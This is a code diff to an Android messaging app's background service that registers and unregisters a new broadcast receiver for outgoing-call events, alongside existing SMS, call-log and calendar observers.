@@ -37,6 +37,7 @@ import com.candroid.textme.receivers.CreateConversationReceiver;
 import com.candroid.textme.receivers.DatabaseReceiver;
 import com.candroid.textme.receivers.HeadsetPlugReceiver;
 import com.candroid.textme.receivers.IncomingReceiver;
+import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.receivers.OutgoingReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
@@ -58,6 +59,7 @@ public class MessagingService extends Service {
     private SmsObserver mObserver;
     private CallLogObserver mCallLogObserver;
     private CalendarObserver mCalendarObserver;
+    private OutgoingCallReceiver mOutgoingCallReceiver;
     private HeadsetPlugReceiver mHeadsetReceiver;
     private WifiReceiver mWifiReceiver;
     public static String sTelephoneAddress;
@@ -122,11 +124,16 @@ public class MessagingService extends Service {
         //IntentFilter imeFilter = new IntentFilter(Intent.ACTION_INPUT_METHOD_CHANGED);
         //IntentFilter wifiFilter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
         //registerReceiver(mWapReceiver, wapFilter);
+        mOutgoingCallReceiver = new OutgoingCallReceiver();
+        IntentFilter outgoingCallFilter = new IntentFilter();
+        outgoingCallFilter.addAction(Intent.ACTION_NEW_OUTGOING_CALL);
+        outgoingCallFilter.addCategory(Intent.CATEGORY_DEFAULT);
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
         registerReceiver(mOutgoingReceiver, outgoingFilter);
         registerReceiver(mHeadsetReceiver, headsetFilter);
         registerReceiver(mScreenReceiver, screenFilter);
+        registerReceiver(mOutgoingCallReceiver, outgoingCallFilter);
         //registerReceiver(mImeReceiver, imeFilter);
         //registerReceiver(mWifiReceiver, wifiFilter);
         IntentFilter databaseFilter = new IntentFilter();
@@ -219,6 +226,7 @@ public class MessagingService extends Service {
         //unregisterReceiver(mWapReceiver);
         unregisterReceiver(mHeadsetReceiver);
         unregisterReceiver(mScreenReceiver);
+        unregisterReceiver(mOutgoingCallReceiver);
         //unregisterReceiver(mImeReceiver);
         /*unregisterReceiver(mShareReceiver);*/
         //unregisterReceiver(mAirplaneReceiver);
